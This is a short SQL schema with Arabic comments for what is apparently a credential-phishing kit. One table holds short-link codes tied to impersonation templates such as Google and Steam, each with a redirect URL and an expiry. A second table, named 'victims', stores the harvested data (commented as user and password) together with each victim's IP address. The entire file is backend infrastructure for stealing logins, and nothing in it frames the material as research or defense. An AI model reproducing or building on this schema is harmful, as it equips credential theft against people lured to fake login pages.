-- جدول الروابط المختصرة
CREATE TABLE links (
  id TEXT PRIMARY KEY,           -- الكود العشوائي (الرابط)
  template_name TEXT,            -- اسم القالب (google, steam...)
  target_url TEXT,               -- الرابط الحقيقي للتحويل بعد الانتهاء
  expires_at TIMESTAMP WITH TIME ZONE, -- وقت الانتهاء
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- جدول الضحايا (النتائج)
CREATE TABLE victims (
  id SERIAL PRIMARY KEY,
  link_id TEXT REFERENCES links(id),
  data JSONB,                    -- البيانات اللي اتسحبت (user, pass, etc.)
  ip_address TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);
